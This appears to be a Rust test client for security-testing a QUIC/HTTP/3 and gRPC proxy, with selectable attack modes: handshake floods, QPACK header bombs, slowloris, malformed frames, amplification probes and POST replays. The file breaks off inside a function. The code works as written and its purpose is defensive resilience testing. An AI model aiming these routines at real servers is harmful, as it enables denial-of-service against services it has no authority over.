//! QUIC/HTTP/3 クライアント（container_security P-03 / F-91 / F-93 攻撃モード）。
//!
//! 環境変数:
//! - VEIL_HOST / VEIL_SNI / VEIL_HTTP3_PORT (default 443)
//! - HTTP3_PATH (default /)
//! - HTTP3_MODE: get | handshake_flood | qpack_bomb | cid_spoof | malformed
//!               | handshake_slowloris | amplification_check | early_data_replay
//!               | grpc_malformed | grpc_header_spoof | grpc_slowloris | grpc_stream_reset
//!               | amplification_spoof | max_streams | migration_spoof | qpack_async_ref
//!               | stream_body_slowloris | qpack_memory_exhaustion
//!               | grpc_qpack_bomb | grpc_max_streams | grpc_half_closed | grpc_malicious_trailers
//!               | grpc_web_malformed | grpc_web_large_b64
//! - HTTP3_REPORT
//! - HTTP3_GRPC_PATH (default /grpc.test.v1.TestService/UnaryCall)
//! - AMPLIFICATION_STRICT (default 1): amplification_check で ratio>3 をエラーにする
//!
//! 終了: 0 = モード成功（攻撃系は crash せず完了）、1 = 失敗

use quiche::h3::NameValue;
use std::env;
use std::fs::OpenOptions;
use std::io::Write;
use std::net::{SocketAddr, ToSocketAddrs, UdpSocket};
use std::time::{Duration, Instant};

const DEFAULT_GRPC_PATH: &str = "/grpc.test.v1.TestService/UnaryCall";

fn log_line(path: &str, msg: &str) {
    if let Ok(mut f) = OpenOptions::new().create(true).append(true).open(path) {
        let _ = writeln!(f, "{}", msg);
    }
    eprintln!("{}", msg);
}

fn main() {
    let host = env::var("VEIL_SNI")
        .or_else(|_| env::var("VEIL_HOST"))
        .unwrap_or_else(|_| "veil-proxy".into());
    let port: u16 = env::var("VEIL_HTTP3_PORT")
        .ok()
        .and_then(|s| s.parse().ok())
        .unwrap_or(443);
    let path = env::var("HTTP3_PATH").unwrap_or_else(|_| "/".into());
    let mode = env::var("HTTP3_MODE").unwrap_or_else(|_| "get".into());
    let report =
        env::var("HTTP3_REPORT").unwrap_or_else(|_| "/results/http3_client_report.txt".into());

    let _ = std::fs::write(&report, "");
    log_line(
        &report,
        &format!(
            "http3_client start host={} port={} path={} mode={}",
            host, port, path, mode
        ),
    );

    let grpc_path = env::var("HTTP3_GRPC_PATH").unwrap_or_else(|_| DEFAULT_GRPC_PATH.into());

    let result = match mode.as_str() {
        "get" | "" => send_http3_get(&host, port, &path).map(|n| format!("ok body_bytes={}", n)),
        "handshake_flood" => handshake_flood(&host, port, 200)
            .map(|n| format!("handshake_flood sent={} packets", n)),
        "qpack_bomb" => qpack_bomb(&host, port, &path)
            .map(|s| format!("qpack_bomb done status_or_err={}", s)),
        "cid_spoof" => cid_spoof(&host, port).map(|n| format!("cid_spoof sent={} packets", n)),
        "malformed" => malformed_frames(&host, port)
            .map(|s| format!("malformed done detail={}", s)),
        // F-92: Initial のみ送ってハンドシェイクを完了させず放置
        "handshake_slowloris" => handshake_slowloris(&host, port)
            .map(|s| format!("handshake_slowloris done detail={}", s)),
        // F-92/F-94: クライアント送信バイト vs サーバ応答バイトの増幅比（RFC 9000 ≤3x）
        "amplification_check" => amplification_check(&host, port)
            .map(|s| format!("amplification_check {}", s)),
        // F-94: 0-RTT / Early Data への非冪等 POST リプレイ
        "early_data_replay" => early_data_replay(&host, port, &path)
            .map(|s| format!("early_data_replay done detail={}", s)),
        // F-93: gRPC over HTTP/3 攻撃モード
        "grpc_malformed" => grpc_malformed(&host, port, &grpc_path)
            .map(|s| format!("grpc_malformed done detail={}", s)),
        "grpc_header_spoof" => grpc_header_spoof(&host, port, &grpc_path)
            .map(|s| format!("grpc_header_spoof done detail={}", s)),
        "grpc_slowloris" => grpc_slowloris(&host, port, &grpc_path)
            .map(|s| format!("grpc_slowloris done detail={}", s)),
        "grpc_stream_reset" => grpc_stream_reset(&host, port, &grpc_path)
            .map(|s| format!("grpc_stream_reset done detail={}", s)),
        // F-96: レポート §5.2 HTTP/3 セキュリティ
        "amplification_spoof" => amplification_spoof(&host, port)
            .map(|s| format!("amplification_spoof {}", s)),
        "max_streams" => max_streams_attack(&host, port, &path)
            .map(|s| format!("max_streams done detail={}", s)),
        "migration_spoof" => migration_spoof(&host, port)
            .map(|s| format!("migration_spoof done detail={}", s)),
        "qpack_async_ref" => qpack_async_ref(&host, port, &path)
            .map(|s| format!("qpack_async_ref done detail={}", s)),
        // F-97: レポート §4 フェーズ3
        "stream_body_slowloris" => stream_body_slowloris(&host, port, &path)
            .map(|s| format!("stream_body_slowloris done detail={}", s)),
        "qpack_memory_exhaustion" => qpack_memory_exhaustion(&host, port, &path)
            .map(|s| format!("qpack_memory_exhaustion done detail={}", s)),
        // F-97: :authority と Host 不一致 → 400 期待
        "authority_host_mismatch" => authority_host_mismatch(&host, port, &path)
            .map(|s| format!("authority_host_mismatch {}", s)),
        // F-99: gRPC over HTTP/3 攻撃モード拡張
        "grpc_qpack_bomb" => grpc_qpack_bomb(&host, port, &grpc_path)
            .map(|s| format!("grpc_qpack_bomb done detail={}", s)),
        "grpc_max_streams" => grpc_max_streams(&host, port, &grpc_path)
            .map(|s| format!("grpc_max_streams done detail={}", s)),
        "grpc_half_closed" => grpc_half_closed(&host, port, &grpc_path)
            .map(|s| format!("grpc_half_closed done detail={}", s)),
        "grpc_malicious_trailers" => grpc_malicious_trailers(&host, port, &grpc_path)
            .map(|s| format!("grpc_malicious_trailers done detail={}", s)),
        "grpc_web_malformed" => grpc_web_malformed(&host, port, &grpc_path)
            .map(|s| format!("grpc_web_malformed done detail={}", s)),
        "grpc_web_large_b64" => grpc_web_large_b64(&host, port, &grpc_path)
            .map(|s| format!("grpc_web_large_b64 done detail={}", s)),
        other => Err(format!("unknown HTTP3_MODE={}", other).into()),
    };

    match result {
        Ok(msg) => {
            log_line(&report, &format!("http3_client: {}", msg));
            std::process::exit(0);
        }
        Err(e) => {
            let msg = format!("{}", e);
            log_line(&report, &format!("http3_client: FAIL {}", msg));
            // 正常 GET / 不明モード / 厳格 amplification 超過は失敗扱い。
            // その他攻撃系はサーバ側 crash 検出を post-health に委ね 0 終了。
            if mode == "get"
                || mode.is_empty()
                || mode == "amplification_check"
                || mode == "amplification_spoof"
                || mode == "authority_host_mismatch"
                || msg.contains("AMPLIFICATION_EXCEEDED")
                || msg.starts_with("unknown HTTP3_MODE")
            {
                std::process::exit(1);
            }
            log_line(
                &report,
                &format!(
                    "http3_client: attack mode completed with client error (ok): {}",
                    msg
                ),
            );
            std::process::exit(0);
        }
    }
}

fn resolve(host: &str, port: u16) -> Result<SocketAddr, Box<dyn std::error::Error>> {
    format!("{}:{}", host, port)
        .to_socket_addrs()?
        .next()
        .ok_or_else(|| "DNS resolve failed".into())
}

fn handshake_flood(
    host: &str,
    port: u16,
    count: usize,
) -> Result<usize, Box<dyn std::error::Error>> {
    let peer = resolve(host, port)?;
    let socket = UdpSocket::bind("0.0.0.0:0")?;
    socket.set_write_timeout(Some(Duration::from_secs(2)))?;
    socket.connect(peer)?;

    // QUIC long-header Initial 風の最小パケット（不正でも受信処理を刺激）
    let mut pkt = vec![0u8; 1200];
    pkt[0] = 0xc0; // long header, Initial
    // version draft/v1
    pkt[1..5].copy_from_slice(&1u32.to_be_bytes());
    pkt[5] = 8; // DCID len
    getrandom::getrandom(&mut pkt[6..14]).ok();
    pkt[14] = 0; // SCID len
    // 残りは乱数
    getrandom::getrandom(&mut pkt[15..]).ok();

    let mut sent = 0usize;
    for i in 0..count {
        // DCID を毎回変えてステートを増やす
        getrandom::getrandom(&mut pkt[6..14]).ok();
        pkt[15] = (i & 0xff) as u8;
        match socket.send(&pkt) {
            Ok(_) => sent += 1,
            Err(_) => break,
        }
    }
    Ok(sent)
}

fn cid_spoof(host: &str, port: u16) -> Result<usize, Box<dyn std::error::Error>> {
    let peer = resolve(host, port)?;
    let socket = UdpSocket::bind("0.0.0.0:0")?;
    socket.set_write_timeout(Some(Duration::from_secs(2)))?;
    socket.connect(peer)?;

    let mut sent = 0usize;
    let mut pkt = [0u8; 64];
    for _ in 0..100 {
        pkt[0] = 0x40; // short header 風
        getrandom::getrandom(&mut pkt[1..]).ok();
        if socket.send(&pkt).is_ok() {
            sent += 1;
        }
    }
    Ok(sent)
}

fn malformed_frames(host: &str, port: u16) -> Result<String, Box<dyn std::error::Error>> {
    // 部分ハンドシェイク後にゴミ UDP を送り、生存確認はプローブ側
    let peer = resolve(host, port)?;
    let socket = UdpSocket::bind("0.0.0.0:0")?;
    socket.set_read_timeout(Some(Duration::from_millis(200)))?;
    socket.set_write_timeout(Some(Duration::from_secs(2)))?;
    socket.connect(peer)?;

    let mut config = quiche::Config::new(quiche::PROTOCOL_VERSION)?;
    config.set_application_protos(quiche::h3::APPLICATION_PROTOCOL)?;
    config.verify_peer(false);
    config.set_max_idle_timeout(5_000);
    config.set_max_recv_udp_payload_size(1350);
    config.set_max_send_udp_payload_size(1350);
    config.set_initial_max_data(1_000_000);
    config.set_initial_max_stream_data_bidi_local(100_000);
    config.set_initial_max_stream_data_bidi_remote(100_000);
    config.set_initial_max_stream_data_uni(100_000);
    config.set_initial_max_streams_bidi(10);
    config.set_initial_max_streams_uni(10);
    config.set_disable_active_migration(true);

    let mut scid = [0u8; quiche::MAX_CONN_ID_LEN];
    getrandom::getrandom(&mut scid).ok();
    let scid = quiche::ConnectionId::from_ref(&scid);
    let mut conn = quiche::connect(Some(host), &scid, socket.local_addr()?, peer, &mut config)?;

    let mut buf = [0u8; 65535];
    let mut out = [0u8; 1350];
    let (write, _) = conn.send(&mut out)?;
    socket.send(&out[..write])?;

    // 数回ポンプ
    for _ in 0..10 {
        match socket.recv(&mut buf) {
            Ok(len) => {
                let recv_info = quiche::RecvInfo {
                    from: peer,
                    to: socket.local_addr()?,
                };
                let _ = conn.recv(&mut buf[..len], recv_info);
            }
            Err(_) => {}
        }
        while let Ok((write, _)) = conn.send(&mut out) {
            let _ = socket.send(&out[..write]);
        }
        if conn.is_established() {
            break;
        }
    }

    // 不正な H3 風バイト列を raw 送信
    let garbage = [0x01, 0xff, 0x00, 0x00, 0x10, 0xde, 0xad, 0xbe, 0xef];
    for _ in 0..20 {
        let _ = socket.send(&garbage);
        let mut junk = [0u8; 200];
        junk[0] = 0x40;
        getrandom::getrandom(&mut junk[1..]).ok();
        let _ = socket.send(&junk);
    }

    Ok(if conn.is_established() {
        "established_then_garbage".into()
    } else {
        "partial_hs_then_garbage".into()
    })
}

fn qpack_bomb(host: &str, port: u16, path: &str) -> Result<String, Box<dyn std::error::Error>> {
    let mut config = quiche::Config::new(quiche::PROTOCOL_VERSION)?;
    config.set_application_protos(quiche::h3::APPLICATION_PROTOCOL)?;
    config.verify_peer(false);
    config.set_max_idle_timeout(15_000);
    config.set_max_recv_udp_payload_size(1350);
    config.set_max_send_udp_payload_size(1350);
    config.set_initial_max_data(10_000_000);
    config.set_initial_max_stream_data_bidi_local(1_000_000);
    config.set_initial_max_stream_data_bidi_remote(1_000_000);
    config.set_initial_max_stream_data_uni(1_000_000);
    config.set_initial_max_streams_bidi(100);
    config.set_initial_max_streams_uni(100);
    config.set_disable_active_migration(true);

    let peer_addr = resolve(host, port)?;
    let socket = UdpSocket::bind("0.0.0.0:0")?;
    socket.set_read_timeout(Some(Duration::from_millis(500)))?;
    socket.set_write_timeout(Some(Duration::from_secs(5)))?;
    socket.connect(peer_addr)?;

    let mut scid = [0u8; quiche::MAX_CONN_ID_LEN];
    getrandom::getrandom(&mut scid).map_err(|_| "random scid failed")?;
    let scid = quiche::ConnectionId::from_ref(&scid);
    let mut conn =
        quiche::connect(Some(host), &scid, socket.local_addr()?, peer_addr, &mut config)?;

    let mut buf = [0u8; 65535];
    let mut out = [0u8; 1350];
    let (write, _) = conn.send(&mut out)?;
    socket.send(&out[..write])?;

    let start = Instant::now();
    let timeout = Duration::from_secs(10);
    while !conn.is_established() {
        if start.elapsed() > timeout {
            return Err("QUIC handshake timeout".into());
        }
        match socket.recv(&mut buf) {
            Ok(len) => {
                let recv_info = quiche::RecvInfo {
                    from: peer_addr,
                    to: socket.local_addr()?,
                };
                conn.recv(&mut buf[..len], recv_info)?;
            }
            Err(e)
                if e.kind() == std::io::ErrorKind::WouldBlock
                    || e.kind() == std::io::ErrorKind::TimedOut => {}
            Err(e) => return Err(Box::new(e)),
        }
        while let Ok((write, _)) = conn.send(&mut out) {
            socket.send(&out[..write])?;
        }
    }

    let h3_config = quiche::h3::Config::new()?;
    let mut h3_conn = quiche::h3::Connection::with_transport(&mut conn, &h3_config)?;

    // 巨大ヘッダ多数（QPACK / ヘッダサイズ枯渇刺激）
    let big = "A".repeat(4096);
    let mut headers = vec![
        quiche::h3::Header::new(b":method", b"GET"),
        quiche::h3::Header::new(b":path", path.as_bytes()),
        quiche::h3::Header::new(b":authority", host.as_bytes()),
        quiche::h3::Header::new(b":scheme", b"https"),
    ];
    for i in 0..32 {
        let name = format!("x-bomb-{}", i);
        headers.push(quiche::h3::Header::new(name.as_bytes(), big.as_bytes()));
    }

    let send_result = h3_conn.send_request(&mut conn, &headers, true);
    while let Ok((write, _)) = conn.send(&mut out) {
        let _ = socket.send(&out[..write]);
    }

    match send_result {
        Ok(stream_id) => {
            let mut status: Option<u16> = None;
            let start = Instant::now();
            while start.elapsed() < Duration::from_secs(5) {
                match socket.recv(&mut buf) {
                    Ok(len) => {
                        let recv_info = quiche::RecvInfo {
                            from: peer_addr,
                            to: socket.local_addr()?,
                        };
                        let _ = conn.recv(&mut buf[..len], recv_info);
                    }
                    Err(_) => {}
                }
                loop {
                    match h3_conn.poll(&mut conn) {
                        Ok((id, quiche::h3::Event::Headers { list, .. })) if id == stream_id => {
                            for h in &list {
                                if h.name() == b":status" {
                                    status = std::str::from_utf8(h.value())
                                        .ok()
                                        .and_then(|s| s.parse().ok());
                                }
                            }
                        }
                        Ok((_, quiche::h3::Event::Finished)) => {
                            return Ok(format!("finished status={:?}", status));
                        }
                        Ok(_) => {}
                        Err(quiche::h3::Error::Done) => break,
                        Err(e) => return Ok(format!("h3_err={}", e)),
                    }
                }
                while let Ok((write, _)) = conn.send(&mut out) {
                    let _ = socket.send(&out[..write]);
                }
                if conn.is_closed() {
                    return Ok(format!("conn_closed status={:?}", status));
                }
            }
            Ok(format!("timeout status={:?}", status))
        }
        Err(e) => Ok(format!("send_rejected={}", e)),
    }
}

/// F-92: Initial 相当パケットを 1 回送り、ハンドシェイクを完了させずに待機する。
/// サーバがアイドルタイムアウトで状態を破棄してもクラッシュしないことをプローブ側 health で確認する。
fn handshake_slowloris(host: &str, port: u16) -> Result<String, Box<dyn std::error::Error>> {
    let peer = resolve(host, port)?;
    let socket = UdpSocket::bind("0.0.0.0:0")?;
    socket.set_read_timeout(Some(Duration::from_millis(300)))?;
    socket.set_write_timeout(Some(Duration::from_secs(2)))?;
    socket.connect(peer)?;

    let mut pkt = vec![0u8; 1200];
    pkt[0] = 0xc0; // long header, Initial
    pkt[1..5].copy_from_slice(&1u32.to_be_bytes());
    pkt[5] = 8;
    getrandom::getrandom(&mut pkt[6..14]).ok();
    pkt[14] = 0;
    getrandom::getrandom(&mut pkt[15..]).ok();
    socket.send(&pkt)?;

    // 応答を軽く読み捨てつつ ~5 秒放置（ハンドシェイク未完了）
    let mut buf = [0u8; 2048];
    let mut recv_bytes = 0usize;
    let start = Instant::now();
    while start.elapsed() < Duration::from_secs(5) {
        match socket.recv(&mut buf) {
            Ok(n) => recv_bytes += n,
            Err(_) => std::thread::sleep(Duration::from_millis(100)),
        }
    }
    Ok(format!("idle_5s recv_bytes={}", recv_bytes))
}

/// F-92: 不完全ハンドシェイク時の UDP 増幅比を概算する。
/// クライアント送信合計とサーバ応答合計を比較し、極端な増幅がないことをログする。
/// （真の IP spoof は権限・ネットワーク制約で不可。増幅耐性の観測用。）
fn amplification_check(host: &str, port: u16) -> Result<String, Box<dyn std::error::Error>> {
    let peer = resolve(host, port)?;
    let socket = UdpSocket::bind("0.0.0.0:0")?;
    socket.set_read_timeout(Some(Duration::from_millis(200)))?;
    socket.set_write_timeout(Some(Duration::from_secs(2)))?;
    socket.connect(peer)?;

    // 小さな Initial 風パケットを数回送る
    let mut sent = 0usize;
    let mut recv = 0usize;
    let mut pkt = vec![0u8; 200]; // 意図的に小さめ（増幅誘発用）
    pkt[0] = 0xc0;
    pkt[1..5].copy_from_slice(&1u32.to_be_bytes());
    pkt[5] = 8;
    getrandom::getrandom(&mut pkt[6..14]).ok();
    pkt[14] = 0;

    for i in 0..10 {
        getrandom::getrandom(&mut pkt[6..14]).ok();
        pkt[15] = (i & 0xff) as u8;
        match socket.send(&pkt) {
            Ok(n) => sent += n,
            Err(_) => break,
        }
        let mut buf = [0u8; 65535];
        let deadline = Instant::now() + Duration::from_millis(150);
        while Instant::now() < deadline {
            match socket.recv(&mut buf) {
                Ok(n) => recv += n,
                Err(_) => break,
            }
        }
    }

    let ratio = if sent == 0 {
        0.0
    } else {
        recv as f64 / sent as f64
    };
    // RFC 9000 §8: アドレス検証前は送信量の 3 倍を超えてはならない。
    // AMPLIFICATION_STRICT=1（既定）で ratio>3 をエラーにする（F-94）。
    let strict = env::var("AMPLIFICATION_STRICT")
        .map(|v| v != "0" && !v.eq_ignore_ascii_case("false"))
        .unwrap_or(true);
    let detail = format!(
        "sent={} recv={} ratio={:.2} (RFC9000 anti-amplification limit=3 before path validation)",
        sent, recv, ratio
    );
    if strict && sent > 0 && ratio > 3.0 {
        return Err(format!("AMPLIFICATION_EXCEEDED {}", detail).into());
    }
    Ok(detail)
}

/// F-94: 0-RTT リプレイ近似 — セッション確立後に非冪等 POST を複数回送り、
/// サーバがクラッシュせず安全に拒否または 1 回処理に留まること（health はプローブ側）。
/// 真の 0-RTT チケット再利用は quiche セッション永続化が必要なため、
/// ここでは「短時間に同一非冪等 POST を連打」してリプレイ面を近似する。
fn early_data_replay(
    host: &str,
    port: u16,
    path: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    // 1 回目: セッション確立 + GET
    let _ = send_http3_get(host, port, path);

    let mut ok = 0u32;
    let mut err = 0u32;
    let body = b"non-idempotent-replay-body";
    for i in 0..5 {
        match send_http3_post(host, port, path, body) {
            Ok(_) => ok += 1,
            Err(e) => {
                err += 1;
                // 接続拒否・リセットは安全な失敗として許容
                let _ = e;
            }
        }
        // わずかに間隔を空けてリプレイ列を作る
        std::thread::sleep(Duration::from_millis(20 + i as u64 * 5));
    }
    Ok(format!(
        "replay_posts ok={} err={} (crash check deferred to post-health)",
        ok, err
    ))
}

fn send_http3_post(
    host: &str,
    port: u16,
    path: &str,
    body: &[u8],
) -> Result<usize, Box<dyn std::error::Error>> {
    let mut session = establish_h3(host, port, 10_000)?;
    let cl = body.len().to_string();
    let headers = vec![
        quiche::h3::Header::new(b":method", b"POST"),
        quiche::h3::Header::new(b":path", path.as_bytes()),
        quiche::h3::Header::new(b":authority", host.as_bytes()),
        quiche::h3::Header::new(b":scheme", b"https"),
        quiche::h3::Header::new(b"content-type", b"application/octet-stream"),
        quiche::h3::Header::new(b"content-length", cl.as_bytes()),
    ];
    let stream_id = session
        .h3
        .send_request(&mut session.conn, &headers, false)?;
    session
        .h3
        .send_body(&mut session.conn, stream_id, body, true)?;
    pump_io(&mut session);

    let mut total = 0usize;
    let start = Instant::now();
    let timeout = Duration::from_secs(5);
    while start.elapsed() < timeout {
        match session.socket.recv(&mut session.buf) {
            Ok(len) => {
                let recv_info = quiche::RecvInfo {
                    from: session.peer_addr,
                    to: session.socket.local_addr()?,
                };
                session.conn.recv(&mut session.buf[..len], recv_info)?;
            }
            Err(e)
                if e.kind() == std::io::ErrorKind::WouldBlock
                    || e.kind() == std::io::ErrorKind::TimedOut =>
            {
                if session.conn.is_closed() {
                    break;
                }
            }
            Err(e) => return Err(Box::new(e)),
        }
        loop {
            match session.h3.poll(&mut session.conn) {
                Ok((id, quiche::h3::Event::Data)) if id == stream_id => {
                    while let Ok(n) =
                        session
                            .h3
                            .recv_body(&mut session.conn, id, &mut session.buf)
                    {
                        total += n;
                        if n == 0 {
                            break;
                        }
                    }
                }
                Ok((id, quiche::h3::Event::Finished)) if id == stream_id => {
                    return Ok(total);
                }
                Ok((id, quiche::h3::Event::Reset(_))) if id == stream_id => {
                    return Ok(total);
                }
                Ok(_) => {}
                Err(quiche::h3::Error::Done) => break,
                Err(e) => return Err(Box::new(e)),
            }
        }
        pump_io(&mut session);
        if session.conn.is_closed() {
            break;
        }
    }
    Ok(total)
}

/// quiche 接続 + H3 トランスポートの共通セットアップ。
struct H3Session {
    socket: UdpSocket,
    peer_addr: SocketAddr,
    conn: quiche::Connection,
    h3: quiche::h3::Connection,
    buf: [u8; 65535],
    out: [u8; 1350],
}

fn make_config(idle_ms: u64) -> Result<quiche::Config, Box<dyn std::error::Error>> {
    let mut config = quiche::Config::new(quiche::PROTOCOL_VERSION)?;
    config.set_application_protos(quiche::h3::APPLICATION_PROTOCOL)?;
    config.verify_peer(false);
    config.set_max_idle_timeout(idle_ms);
    config.set_max_recv_udp_payload_size(1350);
    config.set_max_send_udp_payload_size(1350);
    config.set_initial_max_data(10_000_000);
    config.set_initial_max_stream_data_bidi_local(1_000_000);
    config.set_initial_max_stream_data_bidi_remote(1_000_000);
    config.set_initial_max_stream_data_uni(1_000_000);
    config.set_initial_max_streams_bidi(100);
    config.set_initial_max_streams_uni(100);
    config.set_disable_active_migration(true);
    Ok(config)
}

fn establish_h3(host: &str, port: u16, idle_ms: u64) -> Result<H3Session, Box<dyn std::error::Error>> {
    let mut config = make_config(idle_ms)?;
    let peer_addr = resolve(host, port)?;
    let socket = UdpSocket::bind("0.0.0.0:0")?;
    socket.set_read_timeout(Some(Duration::from_millis(500)))?;
    socket.set_write_timeout(Some(Duration::from_secs(5)))?;
    socket.connect(peer_addr)?;

    let mut scid = [0u8; quiche::MAX_CONN_ID_LEN];
    getrandom::getrandom(&mut scid).map_err(|_| "random scid failed")?;
    let scid = quiche::ConnectionId::from_ref(&scid);
    let mut conn =
        quiche::connect(Some(host), &scid, socket.local_addr()?, peer_addr, &mut config)?;

    let mut buf = [0u8; 65535];
    let mut out = [0u8; 1350];
    let (write, _) = conn.send(&mut out)?;
    socket.send(&out[..write])?;

    let start = Instant::now();
    let timeout = Duration::from_secs(15);
    while !conn.is_established() {
        if start.elapsed() > timeout {
            return Err("QUIC handshake timeout".into());
        }
        match socket.recv(&mut buf) {
            Ok(len) => {
                let recv_info = quiche::RecvInfo {
                    from: peer_addr,
                    to: socket.local_addr()?,
                };
                conn.recv(&mut buf[..len], recv_info)?;
            }
            Err(e)
                if e.kind() == std::io::ErrorKind::WouldBlock
                    || e.kind() == std::io::ErrorKind::TimedOut => {}
            Err(e) => return Err(Box::new(e)),
        }
        while let Ok((write, _)) = conn.send(&mut out) {
            socket.send(&out[..write])?;
        }
    }

    // settle
    let settle_start = Instant::now();
    while settle_start.elapsed() < Duration::from_millis(300) {
        while let Ok((write, _)) = conn.send(&mut out) {
            socket.send(&out[..write])?;
        }
        match socket.recv(&mut buf) {
            Ok(len) => {
                let recv_info = quiche::RecvInfo {
                    from: peer_addr,
                    to: socket.local_addr()?,
                };
                let _ = conn.recv(&mut buf[..len], recv_info);
            }
            Err(_) => {}
        }
    }

    let h3_config = quiche::h3::Config::new()?;
    let h3 = quiche::h3::Connection::with_transport(&mut conn, &h3_config)?;
    Ok(H3Session {
        socket,
        peer_addr,
        conn,
        h3,
        buf,
        out,
    })
}

fn pump_io(session: &mut H3Session) {
    while let Ok((write, _)) = session.conn.send(&mut session.out) {
        let _ = session.socket.send(&session.out[..write]);
    }
    match session.socket.recv(&mut session.buf) {
        Ok(len) => {
            let recv_info = quiche::RecvInfo {
                from: session.peer_addr,
                to: session.socket.local_addr().unwrap_or(session.peer_addr),
            };
            let _ = session.conn.recv(&mut session.buf[..len], recv_info);
        }
        Err(_) => {}
    }
}

fn drain_events(session: &mut H3Session) -> (Option<u16>, bool) {
    let mut status = None;
    let mut finished = false;
    loop {
        match session.h3.poll(&mut session.conn) {
            Ok((_id, quiche::h3::Event::Headers { list, .. })) => {
                for h in &list {
                    if h.name() == b":status" {
                        status = std::str::from_utf8(h.value())
                            .ok()
                            .and_then(|s| s.parse().ok());
                    }
                }
            }
            Ok((id, quiche::h3::Event::Data)) => {
                while let Ok(_n) = session.h3.recv_body(&mut session.conn, id, &mut session.buf) {}
            }
            Ok((_id, quiche::h3::Event::Finished)) => {
                finished = true;
            }
            Ok((_id, quiche::h3::Event::Reset(_))) => {
                finished = true;
            }
            Ok(_) => {}
            Err(quiche::h3::Error::Done) => break,
            Err(_) => {
                finished = true;
                break;
            }
        }
    }
    (status, finished)
}

fn grpc_base_headers(host: &str, path: &str) -> Vec<quiche::h3::Header> {
    vec![
        quiche::h3::Header::new(b":method", b"POST"),
        quiche::h3::Header::new(b":path", path.as_bytes()),
        quiche::h3::Header::new(b":authority", host.as_bytes()),
        quiche::h3::Header::new(b":scheme", b"https"),
        quiche::h3::Header::new(b"content-type", b"application/grpc"),
        quiche::h3::Header::new(b"te", b"trailers"),
    ]
}

/// F-93: 不正 LPM（長さ偽装）を HTTP/3 で送りクラッシュしないこと。
fn grpc_malformed(
    host: &str,
    port: u16,
    path: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut session = establish_h3(host, port, 15_000)?;
    let headers = grpc_base_headers(host, path);
    // flags=0 + length=0x00080000 (512KiB) + 短いボディ（宣言と不一致）
    let mut body = vec![0u8, 0x00, 0x08, 0x00, 0x00];
    body.extend_from_slice(b"BAD");

    let stream_id = session.h3.send_request(&mut session.conn, &headers, false)?;
    session
        .h3
        .send_body(&mut session.conn, stream_id, &body, true)?;
    pump_io(&mut session);

    let start = Instant::now();
    let mut last_status = None;
    while start.elapsed() < Duration::from_secs(8) {
        pump_io(&mut session);
        let (st, fin) = drain_events(&mut session);
        if st.is_some() {
            last_status = st;
        }
        if fin || session.conn.is_closed() {
            break;
        }
    }
    Ok(format!("status={:?} closed={}", last_status, session.conn.is_closed()))
}

/// F-93: クライアントから grpc-status / grpc-message をスプーフィング。
fn grpc_header_spoof(
    host: &str,
    port: u16,
    path: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut session = establish_h3(host, port, 15_000)?;
    let mut headers = grpc_base_headers(host, path);
    headers.push(quiche::h3::Header::new(b"grpc-status", b"0"));
    headers.push(quiche::h3::Header::new(b"grpc-message", b"spoofed"));

    // 最小 LPM: flags=0 length=2 body={}
    let body = [0u8, 0, 0, 0, 2, b'{', b'}'];
    let stream_id = session.h3.send_request(&mut session.conn, &headers, false)?;
    session
        .h3
        .send_body(&mut session.conn, stream_id, &body, true)?;
    pump_io(&mut session);

    let start = Instant::now();
    let mut last_status = None;
    while start.elapsed() < Duration::from_secs(8) {
        pump_io(&mut session);
        let (st, fin) = drain_events(&mut session);
        if st.is_some() {
            last_status = st;
        }
        if fin || session.conn.is_closed() {
            break;
        }
    }
    Ok(format!("status={:?}", last_status))
}

/// F-93: gRPC LPM を 1 バイトずつ極端に遅く送信（QUIC Slowloris）。
fn grpc_slowloris(
    host: &str,
    port: u16,
    path: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut session = establish_h3(host, port, 30_000)?;
    let headers = grpc_base_headers(host, path);
    // LPM: flags=0 length=16 + 16 バイトペイロード
    let mut body = vec![0u8, 0, 0, 0, 16];
    body.extend_from_slice(b"AAAAAAAAAAAAAAAA");

    let stream_id = session.h3.send_request(&mut session.conn, &headers, false)?;
    pump_io(&mut session);

    // 1 バイトずつ ~150ms 間隔で送信（全体 ~3s）
    let mut sent = 0usize;
    for (i, byte) in body.iter().enumerate() {
        let fin = i + 1 == body.len();
        match session
            .h3
            .send_body(&mut session.conn, stream_id, &[*byte], fin)
        {
            Ok(n) => sent += n,
            Err(e) => {
                return Ok(format!("send_stopped early err={} sent={}", e, sent));
            }
        }
        pump_io(&mut session);
        let _ = drain_events(&mut session);
        if session.conn.is_closed() {
            return Ok(format!("conn_closed mid_slowloris sent={}", sent));
        }
        std::thread::sleep(Duration::from_millis(150));
    }

    let start = Instant::now();
    let mut last_status = None;
    while start.elapsed() < Duration::from_secs(5) {
        pump_io(&mut session);
        let (st, fin) = drain_events(&mut session);
        if st.is_some() {
            last_status = st;
        }
        if fin || session.conn.is_closed() {
            break;
        }
    }
    Ok(format!("sent={} status={:?}", sent, last_status))
}

/// F-93: gRPC 通信途中にストリームを RESET（STOP_SENDING / RESET_STREAM 相当）。
fn grpc_stream_reset(
    host: &str,
    port: u16,
    path: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut session = establish_h3(host, port, 15_000)?;
    let headers = grpc_base_headers(host, path);
    // 不完全 LPM（length=32 を宣言し 3 バイトだけ送る）
    let partial = [0u8, 0, 0, 0, 32, b'A', b'B', b'C'];
    let stream_id = session.h3.send_request(&mut session.conn, &headers, false)?;
    session
        .h3
        .send_body(&mut session.conn, stream_id, &partial, false)?;
    pump_io(&mut session);
    let _ = drain_events(&mut session);

    // ストリームをリセット
    let _ = session
        .conn
        .stream_shutdown(stream_id, quiche::Shutdown::Write, 0);
    let _ = session
        .conn
        .stream_shutdown(stream_id, quiche::Shutdown::Read, 0);
    pump_io(&mut session);

    // 少し待ってから生存用に何もしない（health はプローブ側）
    let start = Instant::now();
    while start.elapsed() < Duration::from_secs(2) {
        pump_io(&mut session);
        let _ = drain_events(&mut session);
        if session.conn.is_closed() {
            break;
        }
        std::thread::sleep(Duration::from_millis(50));
    }
    Ok(format!(
        "reset stream_id={} closed={}",
        stream_id,
        session.conn.is_closed()
    ))
}

/// F-96: 複数ソースポートから Initial を連打し、応答肥大化（増幅）を計量する。
/// 真の IP spoof は CAP_NET_RAW が必要なため、別 ephemeral ポートからの Initial flood で近似。
fn amplification_spoof(host: &str, port: u16) -> Result<String, Box<dyn std::error::Error>> {
    let peer = resolve(host, port)?;
